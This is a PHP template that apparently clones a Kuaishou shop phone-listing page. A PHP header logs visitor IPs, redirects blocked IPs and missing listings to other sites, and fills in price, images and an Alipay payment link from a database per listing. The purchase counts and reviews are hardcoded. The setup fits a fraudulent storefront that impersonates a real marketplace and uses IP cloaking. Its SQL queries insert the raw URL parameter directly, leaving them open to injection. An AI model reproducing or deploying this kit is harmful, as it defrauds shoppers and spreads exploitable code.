<!DOCTYPE html>

<?php
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();

if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");

	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	if (stristr($BANIP, $ip)) {
		header('Location:'. htmlspecialchars_decode('http://www.baidu.com').'');
	}

	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }

	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
		_query("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								aid,
								state,
								utime
								)
						VALUES (
								'{$ip}',
								3,
								3,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME2}'
								)"
			);
		  _close();
		  session_destroy();
	}

	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){

	}
	//更新点击率
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{

}
?>

<html lang="zh-CN" class=""><head style="">
        <script>/* CRP 2020-04-29 18:28:30 */
!function(){var e="pc"===g(),t=e?"https://s.kwaixiaodian.com/rest/app/tts/user/log/common":"https://app.kwaixiaodian.com/rest/app/grocery/s/log/ui",n=window,r=document,o=location,a=encodeURIComponent,c=r.head||r.getElementsByTagName("head")[0],i=/^(https?:\/\/)([\w-]+\.)?(static\.yximgs\.com\/)/i,s=["ali-ec","tx-ec","js-ec"],u=window.__crp_state={};!function(){for(var e=0;e<s.length;e++)u[s[e]]=!0}();var f=function(){var t=["action=CDN_RESOURCE_PROTECTOR","ver="+_("lon")+","+_("lat")];e?t.push("os="+g(),"from="+a(o.href),"appver="+v()):t.push("userId="+v(),"platform="+g(),"fullpath="+a(o.hostname),"path="+a(o.pathname),"fromURL="+a(o.search));return t.join("&")}(),p={js:10,css:10,img:100};function l(e){if(function(e){return i.test(e)}(e)){var t=(e.match(i)[2]||"").replace(/\.$/,"");u[t]=!1;for(var n=0;n<s.length;n++)if(t=s[n],u[t])return t&&(t+="."),e.replace(i,"$1"+t+"$3")}}function m(e){e.onerror=function(e){cdnResourceProtector(e)},e.onload=function(){e.onload=e.onerror=null,e=null,h(1)}}function h(e,t){function r(r){setTimeout((function(){var r;(r=n.ksLog)&&r.sendCountTag&&(r.sendCountTag("eshop_crp_"+e,!0),t&&r.sendAction({event:"task",action:"COUNT",tag:"eshop_crp_errurl",url:t},!0),e||v()||n.ksBridge||r.sendCountTag("eshop_crp_env_exception",!0))}),r)}n.ksLog?r(100):r(1e3)}function d(e){if(n.performance&&n.performance.getEntriesByName){var t=performance.getEntriesByName(e);if(t&&t[0])return 0|t[0].duration}return 0}function g(){var e=navigator.userAgent;return/\bmobile\b/i.test(e)?/\bandroid\b/i.test(e)?"android":"ios":"pc"}function v(){return _("ud|userId")}function _(e){var t=document.cookie.match(new RegExp("(?:"+e+")=([^;]+)","i"));return t&&t[1]||""}n.cdnResourceProtector=n.__crp=function(n){try{!function(n){var o=n.target,i="",s="",u=0;o instanceof HTMLImageElement?(u=p.img,i=o.src,(s=l(i))&&(g=s,o.src=g)):o instanceof HTMLScriptElement?(u=p.js,i=o.src,(s=l(i))&&function(e){var t=r.createElement("script");t.async="async",t.charset="utf-8",m(t),t.src=e,c.appendChild(t)}(s)):o instanceof HTMLLinkElement&&"stylesheet"===o.rel&&(u=p.css,i=o.href,(s=l(i))&&function(e){var t=r.createElement("link");t.rel="stylesheet",t.type="text/css",t.charset="utf-8",m(t),t.href=e,c.appendChild(t)}(s));var g;(function(n,r){if(!r)return;if(0!=(o=1,c=r+1,(Math.random()*(c-o)+o|0)%r))return;var o,c;var i=new Image,s=a(function(e){return e.replace(/^(?:https?:\/\/)([^/]+)\/.+/i,"$1")}(n)),u=["ts="+(new Date).getTime(),"ext="+d(n)];!e&&u.push("element="+s,"elementName="+a(n)),e&&u.push("source="+s,"target="+a(n));var p=t+"?"+f+"&"+u.join("&");setTimeout((function(){i.src=p,i=null}),100)})(i,u),h(0,i)}(n)}catch(e){}},n.cdnResourceProtector.setting=function(e){var t,n;for(t=0;t<e.length;t++)n=e[t],p[n[0]]=n[1]}}();</script><script>T1 = new Date().getTime();</script><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=375,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover"><link rel="shortcut icon" href="https://static.yximgs.com/s1/i/favicon-eb2e5f4482.ico" type="image/x-icon" onerror="__crp(event)"><script>function setScale() {
                var isSamsung = window.navigator.userAgent.match(/sm-/i) == 'sm-';
                var innerWidth = window.innerWidth;
                var scale = innerWidth / 375;
                if (scale > 2 || scale < 0.5) {
                    // 少量安卓机型偶现scale计算不正确的情况，用默认scale
                    scale = 1;
                }
                var meta = document.getElementsByTagName('meta')[2];
                meta.content =
                    'width=375,initial-scale=' +
                    scale +
                    ',maximum-scale=' +
                    scale +
                    ',minimum-scale=' +
                    scale +
                    ',user-scalable=no,viewport-fit=cover';
            }
            window.onload = function() {
                setScale();
            };</script><title>快手优品</title><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/app.e4ed8f68.css" rel="preload" as="style" onerror="__crp(event)"><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/chunk-vendors.553c6a81.css" rel="preload" as="style" onerror="__crp(event)"><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/app.8ba6acb7.js" rel="preload" as="script" crossorigin="anonymous" onerror="__crp(event)"><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/chunk-vendors.dd7b1793.js" rel="preload" as="script" crossorigin="anonymous" onerror="__crp(event)"><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/chunk-vendors.553c6a81.css" rel="stylesheet" onerror="__crp(event)"><link href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/app.e4ed8f68.css" rel="stylesheet" onerror="__crp(event)"><script charset="utf-8" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/chunk-05a848d8.ee8b8bd1.js"></script><link rel="stylesheet" type="text/css" href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/PayCounter_detail.dfaaec8d.css"><script charset="utf-8" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/PayCounter_detail.45c3816a.js"></script><link rel="stylesheet" type="text/css" href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/detail_squareFreeCourse.130a15d8.css"><script charset="utf-8" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/detail_squareFreeCourse.3f5f136e.js"></script><link rel="stylesheet" type="text/css" href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/detail_detailPreview.44b2d02c.css"><script charset="utf-8" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/detail_detailPreview.21a2bd52.js"></script><link rel="stylesheet" type="text/css" href="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/css/detail.230e1869.css"><script charset="utf-8" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/js/detail.78c191d4.js"></script><style type="text/css">
    .open-app-confirm-dialog {
        display: none;
        z-index: 999;
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0, 0, 0, 0.3);
    }
    .open-app-popup {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 280px;
        height: 141px;
        background: #FFFFFF;
        border-radius: 20px;
    }
    .open-app-popup-msg {
        width: 100%;
        height: 91px;
        display: flex;
        flex-flow: column nowrap;
        justify-content: center;
        align-items: center;
        border-bottom: 1px solid #E3E3E3;
        font-size: 17px;
        line-height: 24px;
        color: #000000;
        letter-spacing: 0;
        text-align: center;
    }
    .open-app-popup-btns {
        width: 100%;
        height: 50px;
        display: flex;
        flex-flow: row nowrap;
        justify-content: flex-start;
        align-items: center;
    }
    .open-app-popup .popup-btn-cancel {
        flex-grow: 1;
        height: 50px;
        line-height: 50px;
        font-size: 17px;
        letter-spacing: 0;
        text-align: center;
        color: #777777;
    }
    .open-app-popup .popup-btn-confirm {
        flex-grow: 1;
        height: 50px;
        line-height: 50px;
        font-size: 17px;
        letter-spacing: 0;
        text-align: center;
        color: #FF7D35;
    }
    .open-app-popup .sprt-line {
        flex-grow: 0;
        height: 100%;
        width: 1px;
        background: #E3E3E3;
    }
</style><style type="text/css">
    .open-in-browser-dialog {
        display: none;
    }
    .open-in-browser-dialog .mask {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0, 0, 0, 0.7);
        z-index: 1000;
    }
    .open-in-browser-dialog .content {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 115px;
        z-index: 100;
        background: #fff;
        border-radius: 0 0 6px 6px;
        line-height: 30px;
        font-size: 18px;
        padding: 30px 20px;
        box-sizing: border-box;
        z-index: 1000;}
        .open-in-browser-dialog .content .arrow-top-right {
        position: absolute;
        top: 20px;
        right: 17px;
        width: 79px;
        height: 54px;
        background: url("//static.yximgs.com/s1/i/arrow_top_right-5f4320e633.png") 0 0 no-repeat;
        background-size: contain;
    }
    .open-in-browser-dialog .content .line{
        color: black;
    }
    .open-in-browser-dialog .content .line .text{
        margin-right: 10px;
    }
    .open-in-browser-dialog .content .line .dot{
        display: inline-block;
        background-color: #000;
        width: 4px;
        height: 4px;
        border-radius: 50%;
        margin-right: 4px;
        vertical-align: middle;
    }
</style></head><body ontouchstart="" class="">
    <div class="open-in-browser-dialog">
        <div class="mask"></div>
        <div class="content">
            <div class="arrow-top-right"></div>
            <div class="line">
                <span class="text">点击右上角</span>
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </div>
            <div class="line text">选择 "在浏览器中打开"</div>
        </div>
    </div>
    <div class="open-app-confirm-dialog">
        <div class="open-app-popup">
            <div class="open-app-popup-msg">
                <div class="popup-title">即将打开其他应用</div>
                <div class="popup-text">是否打开？</div>
            </div>
            <div class="open-app-popup-btns">
                <div class="popup-btn-cancel">取消</div>
                <div class="sprt-line"></div>
                <div class="popup-btn-confirm">允许</div>
            </div>
        </div>
    </div>
<script>T2 = new Date().getTime();</script>
<noscript>
<strong>We're sorry but knowledge doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
</noscript>
<div data-v-4309bf1a="" id="app" class="transparent">
<!---->
<div data-v-c604da36="" data-v-6cd06ca5="" data-v-4309bf1a="" class="course-detail">
<div data-v-6cd06ca5="" data-v-c604da36="" id="js-detail-scroll" class="course-detail-wrap">
<div data-v-6cd06ca5="" data-v-c604da36="">
<!---->
<div data-v-6cd06ca5="" class="cover-img" data-v-c604da36="" vlog="BUTTON_DETAIL_COVERIMG_separator_405494" index="405494">
<img data-v-10b9144c="" alt="" src="<?php echo $_GoodsID['goods_img1'] ?>" class="image cover-img">
<!----></div><!----><div data-v-6cd06ca5="" class="course-info" data-v-c604da36=""><div class="title"><?php echo $_GoodsID['title'];?></div><!----><div class="subtitle"><?php echo $_GoodsID['att_capacity'];?></div><div class="line-wrap"><div class="price-wrap"><div class="price-desc">抢购价</div><div data-v-42d13dba="" class="course-price"><div data-v-218960e4="" data-v-42d13dba="" class="price-root title"><div data-v-218960e4="" class="rmb">￥</div><div data-v-218960e4="" class="numeric">
            <?php echo $_GoodsID['price'];?>
        </div><!----></div><!----></div></div><div class="c-wrap avatar-wrap"><div class="text">
        
        4369人已购买
    </div><div class="avatar-list">
<span class="avatar-item" style="background: url(&quot;https://js2.a.yximgs.com/uhead/AC2021/08/25/19/BMjAyMTA4MjUxOTQyMTRfMTk5NDQ5OTYwNV8yX2hkODMxXzQ5OA==_s.jpg@base@tag=imgScale&amp;m=1&amp;w=40&amp;q=85&amp;interlace=1&quot;) center center / cover no-repeat;"></span><span class="avatar-item" style="background: url(&quot;https://js2.a.yximgs.com/uhead/AC2020/03/26/01/BMjAyMDAzMjYwMTI3MzRfMTg0OTk3MTQ5MV8yX2hkMTY0Xzc4Nw==_s.jpg@base@tag=imgScale&amp;m=1&amp;w=40&amp;q=85&amp;interlace=1&quot;) center center / cover no-repeat;"></span><span class="avatar-item" style="background: url(&quot;https://js2.a.yximgs.com/uhead/AC2021/12/30/22/BMjAyMTEyMzAyMjA0MjlfMTM4MjU3MzMzMV8yX2hkOTJfMjgy_s.jpg@base@tag=imgScale&amp;m=1&amp;w=40&amp;q=85&amp;interlace=1&quot;) center center / cover no-repeat;"></span></div></div></div><!----><div class="course-tip"><div class="icon iconfont icon-tips"></div><div class="text">支持七天无理由退货</div></div><!----><!----><!----><!----></div><!----><!----><!---->
<div data-v-14b11178="" data-v-6cd06ca5="" class="desc-root" data-v-c604da36="">
<div data-v-0a3afa9b="" data-v-14b11178="" class="card-root desc-content">
<h3 data-v-0a3afa9b="" class="title">商品详情</h3>
<p data-v-14b11178="" data-v-0a3afa9b="" class="desc">
<?php echo $_GoodsID['user_name'];?>
</p>
<div data-v-e1f68d84="" data-v-14b11178="" class="strip-root tag-area" data-v-0a3afa9b=""><div data-v-e1f68d84="" class="content"><div data-v-4fcc8ff8="" data-v-14b11178="" class="icon-title-root" data-v-e1f68d84=""><span data-v-4fcc8ff8="" class="icon iconfont icon-check"></span><span data-v-4fcc8ff8="" class="title">正品保障</span></div><div data-v-4fcc8ff8="" data-v-14b11178="" class="icon-title-root" data-v-e1f68d84=""><span data-v-4fcc8ff8="" class="icon iconfont icon-check"></span><span data-v-4fcc8ff8="" class="title">30天价保</span></div><div data-v-4fcc8ff8="" data-v-14b11178="" class="icon-title-root" data-v-e1f68d84=""><span data-v-4fcc8ff8="" class="icon iconfont icon-check"></span><span data-v-4fcc8ff8="" class="title">支持无理由退货</span></div></div><span data-v-e1f68d84="" class="iconfont icon-arrow-right"></span></div></div><!----><!----></div><div data-v-b11a33d0="" data-v-6cd06ca5="" id="comments" class="components-rate" data-v-c604da36=""><div data-v-b11a33d0="" id="anchor-evaluate" class="js-anchor"></div><div data-v-b11a33d0="" class="components-title">评价</div><!----><div data-v-b11a33d0="" class="rate-wrap"><div data-v-7e4db3b0="" data-v-b11a33d0="" class="comp-rate"><span data-v-7e4db3b0="" class="iconfont star icon-star-full"></span><span data-v-7e4db3b0="" class="iconfont star icon-star-full"></span><span data-v-7e4db3b0="" class="iconfont star icon-star-full"></span><span data-v-7e4db3b0="" class="iconfont star icon-star-full"></span><span data-v-7e4db3b0="" class="iconfont star icon-star-full"></span></div><!----><div data-v-b11a33d0="" class="evaluate-num">2437人已评价</div></div><div data-v-b11a33d0="" class="e-p-l-title">作者精选</div><div data-v-b11a33d0="" class="view-more pick-list"><div class="list-wrap"><div data-v-b11a33d0="" class="e-p-item"><img data-v-b11a33d0="" src="https://js2.a.yximgs.com/uhead/AC2021/01/07/12/BMjAyMTAxMDcxMjEwMDJfMjE5NjY1MDA3MF8yX2hkNTU1XzY5Mw==_s.jpg@base@tag=imgScale&amp;m=1&amp;w=40&amp;q=85&amp;interlace=1" class="avatar"><div data-v-b11a33d0="" class="user">兲***”</div><div data-v-b11a33d0="" class="content">刚开始用，不卡很流利，相机也挺高清，而且面相以及内部软件下载也都挺好，很放心，刚开始还有点不信任呢👍</div><div data-v-b11a33d0="" class="time">2021/11/28 20:51</div></div><div data-v-b11a33d0="" class="e-p-item"><img data-v-b11a33d0="" src="https://js2.a.yximgs.com/uhead/AC2022/01/16/02/BMjAyMjAxMTYwMjExNDFfMjAyNzc3MDkyNF8yX2hkNTU2Xzg1Ng==_s.jpg@base@tag=imgScale&amp;m=1&amp;w=40&amp;q=85&amp;interlace=1" class="avatar"><div data-v-b11a33d0="" class="user">午***安</div><div data-v-b11a33d0="" class="content">运行流畅丝滑,拍照效果完美,星光色+透明壳太好看了,总之体验感优秀,还是值得购买的。我轻度使用,也不打游戏,不下载视频,128G足够使用了。</div><div data-v-b11a33d0="" class="time">2021/11/25 13:24</div></div></div><div data-v-0b826bfe="" class="comp-bottom-load-btn"><div data-v-0b826bfe="" class="center sp-loading" style="display: none;"><svg viewBox="0 0 80 80" class="sp-icon sp-icon_spinner sp-icon__md is-spinner sp-loading__icon" style="stroke: rgb(198, 198, 198); height: 30px; width: 30px; stroke-width: 2px;"><path stroke-dasharray="160" stroke-linecap="round" d="M40 40l8.201-8.201c4.53-4.53 11.873-4.53 16.402 0A11.598 11.598 0 0 1 68 40c0 6.405-5.193 11.598-11.598 11.598a11.598 11.598 0 0 1-8.201-3.397L40 40l-8.201-8.201c-4.53-4.53-11.873-4.53-16.402 0A11.598 11.598 0 0 0 12 40c0 6.405 5.193 11.598 11.598 11.598 3.076 0 6.026-1.222 8.201-3.397L40 40z" stroke-width="7" fill="none" fill-rule="evenodd"></path></svg></div><a data-v-0b826bfe="" class="c-b-l-btn center" vlog="BUTTON_DETAIL_COMMENTS_VIEW_MORE"><span data-v-0b826bfe="">更多评价</span><span data-v-0b826bfe="" class=""></span></a></div></div></div><section data-v-4d60546c="" data-v-6cd06ca5="" id="lesson-list-wrap" class="intro lesson-list" data-v-c604da36="">
  <div data-v-4d60546c="" id="anchor-lesson-list" class="js-anchor"></div>
  <div data-v-4d60546c="" id="lesson-list-content"></div>
  <h3 data-v-4d60546c="">商品介绍</h3>
  <div data-v-4d60546c="" class="lesson-content">
    <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="1" class="wrapper" vlog="CARD_LESSON_separator_1">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!---->
            <span data-v-f769716a="" class="card-title-content">商品名称：<?php echo $_GoodsID['att_color'];?></span>
            <!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
    <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="2" class="wrapper" vlog="CARD_LESSON_separator_2">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">商品编号：70323403845</span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
    <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="3" class="wrapper" vlog="CARD_LESSON_separator_3">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">商品毛重：125.00g</span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
    <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="4" class="wrapper" vlog="CARD_LESSON_separator_4">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">CPU型号：<?php echo $_GoodsID['doods_num'];?></span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
    <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="5" class="wrapper" vlog="CARD_LESSON_separator_5">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">运行内存：4G</span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
  </div>
	<div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="5" class="wrapper" vlog="CARD_LESSON_separator_5">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">后摄主摄像素1200万像素</span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
<div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="5" class="wrapper" vlog="CARD_LESSON_separator_5">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">前摄主摄像素1200万像素</span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
  <div data-v-f769716a="" data-v-4d60546c="" class="lesson-card">
      <div data-v-f769716a="" index="5" class="wrapper" vlog="CARD_LESSON_separator_5">
        <div data-v-f769716a="" class="left-no"></div>
        <div data-v-f769716a="" class="card-info">
          <div data-v-f769716a="" class="card-title">
            <!----><span data-v-f769716a="" class="card-title-content">系统：<?php echo $_GoodsID['freight'];?></span><!---->
          </div>
          <!---->
        </div>
        <!---->
      </div>
    </div>
  
  
</section>

<div data-v-19fadde2="" data-v-6cd06ca5="" class="teacher" data-v-c604da36="" vlog="BUTTON_DETAIL_TEACHER_MODULE">
    <div data-v-19fadde2="" id="anchor-teacher" class="js-anchor">
        
    </div>
    <div data-v-19fadde2="" class="teacher-title">商家</div>
    <a data-v-19fadde2="" class="author" href="https://live.kuaishou.com/profile/Q1808855984?" vlog="BUTTON_DETAIL_TEACHER_PROFILE">
        <img data-v-19fadde2="" src="https://p5.a.yximgs.com/uhead/AB/2020/02/09/20/BMjAyMDAyMDkyMDIyMDVfOTQ1NDE4Mjg4XzFfaGQzNThfNTAz_s.jpg">
        <div data-v-19fadde2="" class="teacher-name">小阿娟手机</div>
        <span data-v-19fadde2="" class="iconfont icon-arrow-right"></span></a><div data-v-19fadde2="" class="teacher-intro-wrap ks-1px-t"><div data-v-19fadde2="" class="teacher-desc">
                实体店手机批发💯正品💯保证   实体店发货❤️专业卖手机📱8年的小可爱❤️   机器顺丰包邮，纯原品质，质保一年❤️   主动添加主动私信你们的都是骗子，感谢快手官方，感谢老铁关注，支持快手正能量！</div></div><!----></div><!----><!----><div data-v-312869eb="" data-v-6cd06ca5="" class="square-btn" data-v-c604da36="" vlog="BUTTON_DETAIL_SQUARE_BTN"><p data-v-312869eb="">去广场，发现更多实用有趣的内容</p><span data-v-312869eb="" class="iconfont icon-arrow-right"></span></div><section data-v-6cd06ca5="" data-v-c604da36="" class="link-wrap no-top"><div data-v-17aa2761="" data-v-6cd06ca5="" class="protocol-root checkbox-label protocol-root-large" data-v-c604da36="" vlog="CARD_TOPROTOCOL"><div data-v-17aa2761="" class="sp-checkbox sp-checkbox--selected"><label slot="title" class="sp-checkbox__label"><div class="sp-checkbox__ui-wrapper"><input type="checkbox" class="sp-checkbox__input" value=""> <div class="sp-checkbox__ui"><i></i></div></div> <div class="sp-checkbox__label-text"><i data-v-17aa2761="" class="protocol-select-i"></i><p data-v-17aa2761="" class="protocol-content">
            我已阅读并同意
            <a data-v-e0557940="" data-v-17aa2761="" class="openlink-root openlink-root-large"></a><a data-v-e0557940="" data-v-17aa2761="" class="openlink-root openlink-root-large">
                《购买使用指南》
            </a></p></div></label></div></div><div data-v-6cd06ca5="" data-v-c604da36="" class="virtual-tip">已经到底啦~</div></section></div></div><div data-v-4df5d624="" data-v-6cd06ca5="" class="bottom-bar" data-v-c604da36=""><!----><footer data-v-4df5d624="" class="bottom ks-1px-t"><!----><!----><div data-v-cf141bd2="" data-v-4df5d624="" class="sp-button-group"><!----><button href="alibaba500.php" data-v-4df5d624="" type="button" ontouchstart="" size="large" nativetype="button" class="buy-btn sp-button sp-button--primary sp-button--large" data-v-cf141bd2="" vlog="CARD_SHOWFOOTERPRICE"><div class="sp-button__content"><!----> <div class="sp-button__text"><span data-v-4df5d624="" class="text"><a href="<?php echo $_GoodsID['zhifubaoURL'];?>" data-footer-order-btn-name="立即订购"></span><span data-v-4df5d624="" class="price">
                            
                            <div data-v-218960e4="" data-v-4df5d624="" class="price-root "><div data-v-218960e4="" class="rmb"></div><div data-v-218960e4="" class="numeric">立即购买</div><!----></div></span></div></div></button></div></footer></div><!----><div data-v-15b3282f="" data-v-6cd06ca5="" data-v-c604da36=""><div data-v-15b3282f="" class="bottom-layer"><div data-v-6cd06ca5="" data-v-15b3282f="" class="layer-consulte"><div data-v-6cd06ca5="" data-v-15b3282f="" class="layer-consulte-title">
                    培训讲师会主动联系你，帮助你了解学习规划和报名事项
                </div><div data-v-6cd06ca5="" data-v-15b3282f="" class="layer-consulte-content"><div data-v-6cd06ca5="" class="phone-input sp-input" data-v-15b3282f=""><div class="sp-input__prefix"></div> <input type="text" placeholder="请输入手机号" maxlength="11" class="sp-input__field"> <div class="sp-input__suffix"><!----> </div></div><div data-v-6cd06ca5="" data-v-15b3282f="" class="layer-tag"><span data-v-6cd06ca5="" data-v-15b3282f="" class="icon iconfont icon-safe"></span><span data-v-6cd06ca5="" data-v-15b3282f="" class="gray">不对外泄漏手机号</span><span data-v-6cd06ca5="" data-v-15b3282f="" class="icon iconfont icon-safe"></span><span data-v-6cd06ca5="" data-v-15b3282f="" class="gray">无强制推销</span></div></div><div data-v-6cd06ca5="" data-v-15b3282f="" class="btn-wrap"><button data-v-6cd06ca5="" type="button" disabled="disabled" ontouchstart="" size="large" nativetype="button" class="sp-button sp-button--primary sp-button--disabled sp-button--large" data-v-15b3282f="" vlog="BUTTON_SUBMITINTEREST"><div class="sp-button__content"><!----> <div class="sp-button__text">预约咨询</div></div></button></div></div></div><div data-v-15b3282f="" class="mask-bg"></div></div><!----><!----><!----><div data-v-6cd06ca5="" class="sp-dialog" data-v-c604da36=""><div><div class="sp-popup is-center is-mask-show" style="display: none;"><div class="sp-popup__mask" style="display: none;"></div> <div class="sp-popup__box fade-grow" style="display: none;"><div class="sp-dialog__content"><h2 class="sp-dialog__title">
                提示
            </h2> <div class="sp-dialog__body"><p data-v-6cd06ca5="" style="text-align: center; margin-bottom: 24px;">帮卖申请将在72小时内完成审核...</p><p data-v-6cd06ca5="" style="text-align: left;">
            你可以在【侧边栏-更多-付费精选-帮卖-我的帮卖】中查看进度
        </p></div> <footer class="sp-dialog__actions"><a role="button">我知道了</a></footer></div></div></div></div></div><div data-v-6cd06ca5="" class="sp-dialog" data-v-c604da36=""><div><div class="sp-popup is-center is-mask-show" style="display: none;"><div class="sp-popup__mask" style="display: none;"></div> <div class="sp-popup__box fade-grow" style="display: none;"><div class="sp-dialog__content"><h2 class="sp-dialog__title">
                提示
            </h2> <div class="sp-dialog__body"><p data-v-6cd06ca5="" style="text-align: left;">
            使用该功能需要您同步完成微信和支付宝授权绑定，否则无法帮卖~，一经绑定不能修改
        </p></div> <footer class="sp-dialog__actions"><a role="button">再想想</a><a role="button">去配置</a></footer></div></div></div></div></div><div data-v-83f73772="" data-v-6cd06ca5="" data-v-c604da36=""><div class="sp-popup is-center is-mask-show" style="display: none;"><div class="sp-popup__mask" style="display: none;"></div> <div class="sp-popup__box fade-grow" style="display: none;"><div data-v-83f73772="" class="confirm-body"><p data-v-83f73772="" class="title">是否确认帮卖？</p><div data-v-83f73772="" class="content"><p data-v-6cd06ca5="" class="desc-item">1.每卖出一单，最多可获得¥0</p><p data-v-6cd06ca5="" class="desc-item">2.目前IOS用户不能购买您帮卖的内容。</p><p data-v-6cd06ca5="" class="desc-item">
            3.帮卖后，该内容会出现在您的【个人主页-付费精选】中。
        </p><p data-v-6cd06ca5="" class="desc-item">4.实际收入以下方协议公式计算结果为准。</p><div data-v-17aa2761="" data-v-6cd06ca5="" class="protocol-root protocol-root-"><div data-v-17aa2761="" class="sp-checkbox"><label slot="title" class="sp-checkbox__label"><div class="sp-checkbox__ui-wrapper"><input type="checkbox" class="sp-checkbox__input" value=""> <div class="sp-checkbox__ui"><i></i></div></div> <div class="sp-checkbox__label-text"><i data-v-17aa2761="" class="protocol-select-i"></i><p data-v-17aa2761="" class="protocol-content">
            我已阅读并同意
            <a data-v-e0557940="" data-v-17aa2761="" class="openlink-root openlink-root-">
                《付费内容生产者帮卖者协议》
            </a></p></div></label></div></div></div><div data-v-83f73772="" class="footer"><div data-v-83f73772="" class="btn cancel-btn">
                再想想
            </div><div data-v-83f73772="" class="btn ok-btn btn-disabled">
                确认
            </div></div></div></div></div></div><div data-v-bd609f0e="" data-v-6cd06ca5="" class="sp-dialog" data-v-c604da36=""><div><div class="sp-popup is-center is-mask-show" style="display: none;"><div class="sp-popup__mask" style="display: none;"></div> <div class="sp-popup__box fade-grow" style="display: none;"><div class="sp-dialog__content"><h2 class="sp-dialog__title">
                你已购买成功
